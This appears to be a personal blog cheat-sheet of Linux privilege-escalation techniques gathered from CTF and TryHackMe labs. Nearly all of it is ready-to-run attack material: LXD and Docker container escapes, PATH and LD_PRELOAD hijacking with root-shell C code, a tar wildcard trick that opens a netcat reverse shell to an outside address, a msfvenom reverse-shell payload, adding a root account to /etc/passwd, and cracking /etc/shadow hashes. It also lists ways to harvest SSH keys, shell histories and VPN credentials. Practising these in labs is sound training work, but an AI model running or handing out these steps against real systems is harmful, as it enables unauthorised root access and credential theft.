---
title: "Linux Privilege Escaltion"
date: 2021-02-15 16.40 
categories: [Linux, Privilege_Escalation]
tags: [linux ,privilege_escaltion, groups, kernel_exploits ,misconfigured_services ,permissions]
author: LXD
image: /assets/img/posts/anonymous/privilege_escaltion.png
---

![privilege_escaltion](/assets/img/posts/misc/privilege_escaltion.png)


Linux:
**#Privilege_Escalation_with_Intresting_Groups**

**lxd/lxc**

Firstly ,get the required files for attack from github
- `git clone https://github.com/saghul/lxd-alpine-builder.git`
- `cd lxd-alpine-builder | ./build-alpine`

Now open a python server to share the output gunzip file (both of them works) 
- `cd /tmp | wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz`

We can now add our image to the target's memory
- `lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage`
- Let's check : `lxc image list`

Last step give the right permission to not having security issues
- `lxc init myimage ignite -c security.privileged=true`
- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
- `lxc start ignite`
- `lxc exec ignite /bin/sh`
- `cd /mnt/root/root`

SOURCE = https://www.hackingarticles.in/lxd-privilege-escalation/
***
**#Privilege_Escalation_with_executable_files**
Note: We will follow a example that we have a elf file and that elf file is calling tail in another user in the system and we don't have enough privilige to change anything over there.


- let's create a folder inside /tmp called attacker `mkdir /tmp/attacker`
- Go into it. `cd /tmp/attacker` 
- Now let's change the /usr/bin folder to /tmp/attacker using the command `export PATH=/tmp/attacker:$PATH`

Now we're going to create the tail file, let's add this to it:

- `echo '#!/bin/bash' > tail`
- `echo '/bin/bash' >> tail`

After that let's type `chmod +x tail`. Now let's go back to the `$PE_Vector_file` folder and let's run it.

***
**#Privilege_Escalation_with_Path_Variable_Manipulation**
1- If the result of `sudo -l` returning an extraordinary program,
2- And if that program calling some other programs (eg:curl) without path
Then you can exploit it with:
- `cd /tmp | echo /bin/sh > $program_name`
- `chmod 777 $program_name`
- `export PATH=/tmp:$PATH`
- `/way/to/the/program` to run it and gain root access

***
**#Tar_wildcard_file_compressing_escalation**
If you see an ouput like this from /etc/crontab :
`cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`
Then we can exploit it like this:
```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f
EOF
```
Then:
- `echo "" > "/home/andre/backup/--checkpoint=1"`
- `echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"`

Open a listener wait for the incoming connection
***
**#LD_PRELOAD**
If you see a specific program in return of `sudo -l` and it uses `LD_PRELOAD` You can exploit it like that in order to get root user:
- `cd /tmp | touch root.c`
- `nano root.c` Here is the exploit code:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/sh");
}
```
- `gcc -fPIC -shared -o shell.so root.c -nostartfiles`
- And the final step `sudo LD_PRELOAD=/tmp/shell.so /path/to/privesc/vector/program`

***
**#Environment_Privilege_Escalation**
If you saw a software that has suidbit(`-rwSr-xr-x`) set and/or owned by the root user you can just exploit it with following commands:

Let's say the name of the program is `current-date` and program is using the `date` command;
- `cd /tmp`
- `echo "/bin/bash" > date`
- `chmod 777 date`
- `export PATH=/tmp:$PATH`
- go back to the original privilege escalate vector program's directory and run it!

REFERENCE
- OSCP Realistic Linux Machine - Nully Cybersecurity Vulnhub.mp4:47:00

*Example*
-If you saw a program on the machine and working with root permission and you can't modify it then ,see which services/progras running on the software ,then `export PATH=/tmp:$PATH` route it a script (`/bin/bash` OR` /bin/sh`) ,run the program again ,select it from the menu ,boom you're the root (for more details : FTP and Linux Environment Variables - TryHackMe Kenobi.mp4 44:00)

***
**#Openssl_Capabilities**
If you see this result under Capabilities[+] column in linpeas
`/usr/bin/openssl = cap_setuid+ep`
It's defenitely exploitable ,and that's what we gonna do

1 - Create a file calling rootshell.c
``` C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/engine.h>

static const char *engine_id = "root shell";
static const char *engine_name = "Spawns a root shell";

static int bind(ENGINE *e, const char *id)
{
    int ret = 0;

    if (!ENGINE_set_id(e, engine_id)) {
        fprintf(stderr, "ENGINE_set_id failed\n");
        goto end;
    }
    
    if (!ENGINE_set_name(e, engine_name)) {
        printf("ENGINE_set_name failed\n");
        goto end;
    }

    setuid(0);
    setgid(0);
    system("/bin/bash");
    
    ret = 1;
    
    end:
    return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
2 - Debug it! `gcc -fPIC -o rootshell.o -c rootshell.c | gcc -shared -o rootshell.so -lcrypto rootshell.o`

3 - Transfer the file to target's /tmp folder

4 - Give the right permissions `chmod +x rootshell.so`

5 - Launch it! `openssl req -engine ./rootshell.so`

REFERENCES:
- https://www.aldeid.com/wiki/TryHackMe-Mindgames#Capabilities
- https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/
***
**#Python_Capabilities**
If you see this result under Capabilities[+] column in linpeas or in result of `getcap -r / 2>/dev/null`

- Go to the capable software's directory
- Let's check if the vulnerability indeedly exist `ls -al python3`
- And lastly `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

REFERENCES:
- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
***
**#Perl_Capabilities**
If you see this result under Capabilities[+] column in linpeas
`/usr/bin/perl = cap_setuid+ep`
then ,run following command :
- `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`

REFERENCES:
- https://www.aldeid.com/wiki/TryHackMe-Wonderland#From_hatter_to_root_(privesc)
- https://gtfobins.github.io/gtfobins/perl/#capabilities
***
If the methodology is routing you to a directory that owned by root ,then you can do this to create some files:

1 -  `mkdir -p /tmp/shop; echo 'import os; os.system("/bin/bash");' > /tmp/shop/shop.py`

2 - `sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py`
***
**Things To Check**

- Check /opt directory ,there might be some interesting files

- If target have nmap version between 2.02 - 5.21 then you can use `nmap --interactive |!sh`

- Always use `sudo -l` command ,if there is a user ,you can abuse it for gaing root access ,if there is a service or program go to gtfo bins ,paste the service ,seek for sudo ,follow the instrucrions and you are the root

- If you see a file like `motd.legal-displayed` ,or any file with `motd` text it is most likely your privesc vector ,you can get the exploit from : https://exploit-db.com/exploit/14339

-`routel` to list the services that try to reach specific destinations 

- If you see a file like this `/usr/sbin/checker` that checking if the user is admin, then `export admin=1 | /usr/sbin/checker`

- Breaking docker container : firstly find docker container : `locate .docker` ,then `/tmp/docker ps`  ,finally :`/tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt sh`

- If you see a output like this from `sudo -l` : `(root) NOPASSWD: /usr/bin/tee` ,you can exploit it like that:

	- `openssl passwd -1 -salt "inferno" "dante"` : (this one will be our user and password)
	- `printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd`
	- The final stet :`su inferno` (passwd=dante)

- Check sudo version ,there might be a vulnerability ,actually ,check all the service that running ,if you stuck ,they will be useful

- If target have a python script that running on another user ,check if that script editable first if not ,then check if that script calling another script or not ,if not ,check if the script using `import` ,if yes than create a script that import command calls (eg:`random,date,time`) embed reverse shell init ,and run the main script.



- You can use auto escalation tools such as **linpeas/exploit suggester/sherlock/powerup** etc.

- If you see an output like this(`(my2user) NOPASSWD : /bin/bash /opt/files/checker.sh`) from `sudo -l` ,you can :
- `sudo -u my2user /bin/bash /opt/files/checker.sh`
OR
- If you can edit the program : go add the line `/bin/bash`

- Use `uname -a` ,get the kernel version ,and look for possible exploits

- If you see `(ALL ,!root) /bin/bash` or `NOPASSWD: ALL` in the result of `sudo -l` then you can escalete your permissions with `sudo -u#-1 /bin/bash` or `sudo -u $USER /bin/bash`

- If you see some kind of output like this `/usr/bin/vi /home/gwendoline/user.txt` in results of `sudo -l` command ,then you can know it's a CVE vulnerability (CVE-2019-14287) You can exploit it with following command `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt` (make it up for the situation)

- You can check crontab via `cat /etc/crontab` ,sometimes there's some programs that scheduled on an exact time ,if you see one ,edit it ,and get your root access

- Finding credentials in .conf files(`find / -type f -name *.conf 2>/dev/null`)

- check *.sudo_as_admin_successful*

- If you getting `sudo: no tty present and no askpass program specified` error ,then 
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`

-`netcat -tl` (-t: list only tcp protocol ,-l: list all the listening port)

-`cat /etc/issue` for linux distro version

-`cat /proc/version` for linux version

- If you see `docker` group in return of `id` command:
	- Get docker image with `docker images` (under REPOSITORY)
	- run `docker run -v /:/mnt --rm -it $IMAGE chroot /mnt bash` to get root

- if `/etc/shadow` is readable you can get the root's hash (entire line) ,go back your attacker machine ,save the hash as a file ,john it (```john --wordlist=/usr/share/wordlists/rockyou.txt hash
```) ,finally `john --show hash` 

- You can crack other users password with john ,go to `/etc/passwd` get user name and hash (eg Adam:$hash), save it into a file ,then john it (`john --wordlist=/usr/share/wordlists/rockyou.txt hash`)

- if `/etc/passwd` is editable then (`mkpasswd -m sha-512 newpasswordhere`) ,copy the hash ,paste it into `/etc/passwd`'s root hash [it is also possible doing same thing on /etc/passwd ,just change the "x" with the hash that you created ]

- If you saw a program running on the cron jobs > then copy the file name > go to user's home directory > nano file name  >
```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
> wait till end of the minute > check `/tmp` file ,if program does exist then `/tmp/rootbash -p` .. you're the root#

- If there is a file running on root/user permissions ,modify it with following commands:

1 - `echo  "touch /home/user/.ssh/id_rsa" > helloworld.sh` (if .ssh folder exist, if not then ,create it)

2 - create a ssh key with `ssh-keygen in` attacker(local) machine

3 - open a listener in the path that you created ssh key

4 - copy id_rsa key to target's home directory `echo  "wget http://attacker_ip:port/id_rsa /home/user/.ssh/id_rsa" > helloworld.sh`

5 - now you can connect the more privileged user via ssh

***NOTE : https://tryhackme.com/room/linuxprivesc is a great source to practice***

- check user group (for an example if user group in docker you can run : `docker run -v /:/mnt --rm -it bash chroot /mnt bash`)

- `/etc/sudoers`

- `find / -perm 4000 -type f -exec ls -la {} 2>/dev/null \;`

- `find / -perm -u=s -type f 2>/dev/null`

- `find / -user root -perm -u=s 2>/dev/null`

- `getcap -r / 2>/dev/null` to find capabilites (route it to /dev/null to get a clean list)

- `find / -name *alice* -type f 2>/dev/null`

- `cat /root/.ssh/id_rsa` (worth to try)

- check if `/etc/passwd` modifyable ,if it is then > download `/etc/passwd` > create a pass with openssl passwd  ,modify the root line `root:x:0:0:root:/root:/bin/bash` to `root:[password_from_openssl]:0:0:root:/root:/bin/bash`

- (switching user via `/etc/passwd` cracking) `cat /etc/passwd` ,get the users hashes ,save them in a file ,crack it with `john hash_file wordlist=/ust/share/wordlists/rockyou.txt`

- **(finding ssh folder in target machine)`find / -type f -name .ssh 2>/dev/null`**

- if there's a file running with root permissions ,you can either edit it (if editable) with changing as a root reverse shell to a new listener or setuid exploit(serch for it in internet)

- ***(linpeas one liner) `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`***

***
**Complicated Manual ways :**
1:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf` [transfer the file to the target]
[cd user's home directory]
`wget http://11.11.11.11:80/shell.elf`
`chmod +x /home/user/shell.elf`
`nc -nvlp 4444` [**do not run the program ,it's a crotab job ,it will automatically spawn root shell on the listener**]
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
2:
```
/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```
3:
*"In **Bash versions <4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.*

**Verify the version of Bash installed on the Debian VM is less than 4.2-048:"**
```
/bin/bash --version
bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
4:
"**Note: This will not work on Bash versions 4.4 and above.**

*When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.*

*Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:"*
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```
5: (this one generally fits to real life)
`cat ~/.*history | less`

6: (this as well)
`find / -type f -name .ovpn 2>/dev/null` (find the auth-user-pass line)
`cat /etc/openvpn/auth.txt` (replace it with actual one)